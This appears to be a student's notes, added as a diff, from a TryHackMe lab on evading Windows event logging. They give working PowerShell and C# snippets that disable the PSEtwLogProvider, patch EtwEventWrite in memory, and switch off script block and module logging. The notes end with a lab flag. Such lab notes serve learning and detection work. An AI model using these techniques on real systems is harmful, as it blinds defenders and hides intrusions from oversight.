@@ -1,0 +1,163 @@
+-SIEM (Security Information and Event Manager)
+-primary target for an attacker is event logs managed by ETW
+-ETW (Envent Tracing for Windows)
+
+--------------------------------------------------------------------------
+
+Event tracing
+-ETW handle logging at application and kernel levels
+-event Ids are core feature of windows logging
+-events are sent and transferred in XML (Extensible Markup Language)
+-events that could be generated when carrying out operation can disrupt goals of attacker
+
+componenets
+-Controllers: build and configure sessions
+-Providers: generate events
+-Consumer: interpret events
+
+Windows event id log list 
+https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+Approaches to log evasion
+-typical log forwarding is employed 
+-log forwarding: move logs from the host machine to a central server or indexer so they won't be modified later
+1102: logs when the windows security audit log was cleared
+104: logs when the log file was cleared
+1100: logs when the windows event log service was shut down
+-process of deleting logs risks operational security
+
+----------------------------------------------------------------------------------------------------------------------
+
+Tracing instrumentation
+-controller define size and location of the log file, start and stop event tracing sessions, enable providers, manage size of buffer pool, obtain execution stats
+-providers contain event tracing instrumentation
+four types of providers
+1. MOF (managed object format): defines events from MOF classes. Enabled by one trace session at a time
+2. WPP (windows software trace preprocessor): associated with TMF (trace message format) files to decode info. enabled by one trace session at a time.
+3. Manifest-Based: Defines events from a manifest. enabled by up to eight trace sessions at a time
+4. TraceLogging: self-describing events containing all required information. enabled by up to eight trace sessions at a time
+-consumers are applications that select one or more event tracig sessions as a source of events. can get stored or real time events
+
+techniques to target each ETW component
+Provider -> PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation
+Controller -> Patching EtwEventWrite, Runtime Tracing Tampering, 
+Consumers -> Log Smashing, Log Tampering
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Inside .NET assembly - information about assembly contents - metadata
+.NET assembly: PSEtwLogProvider
+
+-obtain .NET assembly for PSEtwLogProvider
+$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+
+-store a null value for etwProvider
+$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+
+-set field for m_enabled to previously stored value
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+
+-compile into one ps file
+-run other code
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Patching Tracing Function
+-ETW loaded from runtime of every new process - CLR (common language runtime)
+-can write pre-defined opcodes to an in-memory function to disable functionalities
+-LIFO - last in first out structure
+-ETW is written from the function EtwEventWrite
+
+-assembly ret 14h will end the function and return to previous application
+-steps: 
+1. obtain handle for EtwEventWrite
+var ntdll = Win32.LoadLibrary("ntdll.dll");
+var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+2. Modify Memory permissions of the function - flNewProtect - 0x40 enables X,R,RW
+uint oldProtect;
+Win32.VirtualProtect(
+	etwFunction, 
+	(UIntPtr)patch.Length, 
+	0x40, 
+	out oldProtect
+);
+
+3. Write opcode bytes to memory - Marshal.Copy to write opcode
+patch(new byte[] { 0xc2, 0x14, 0x00 });
+Marshal.Copy(
+	patch, 
+	0, 
+	etwEventSend, 
+	patch.Length
+);
+
+4. Reset memory permissions of the function
+VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
+
+5. Flush the instruction cache
+Win32.FlushInstructionCache(
+	etwFunction,
+	NULL
+);
+
+-----------------------------------------------------------------------------------------------------------
+
+Providers via policy
+-Group Policy object - enable policies
+-Script block logging - 4104:
+-expose scripts of attackers if not properly obfuscated 
+
+-Module logging - 4103:
+-log any modules and data sent from it
+-each session logs its own module 
+
+-goal of disabling these providers is to limit the visibility of components require while making the env seem untrampered
+
+----------------------------------------------------------------------------------------------------------------------
+
+Group policy takeover
+1. Obtain group policy settings from the utility cache
+-reflection
+$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+
+2. Modify generic provider to 0
+-GPO variable setting to 0
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 //4104
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 //4103
+-compile together and append to malicious ps script
+
+3. Modify the incovation or module definition
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Abusing log pipeline
+1. Obtain target module
+$module = Get-Module Microsoft.PowerShell.Utility # Get target module
+
+2. Set module execution details to $false
+$module.LogPipelineExecutionDetails = $false # Set module execution details to false
+
+3. Obtain the module snap-in
+$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
+
+4. set snap-in execution details to $false
+$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+Real world scenario
+
+steps: run powershell
+.\gpo-bypass.ps1
+-clear logs from event viewer and disable logs
+.\agent.exe
+
+THM{51l3n7_l1k3_4_5n4k3}
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Real World Scenario
+
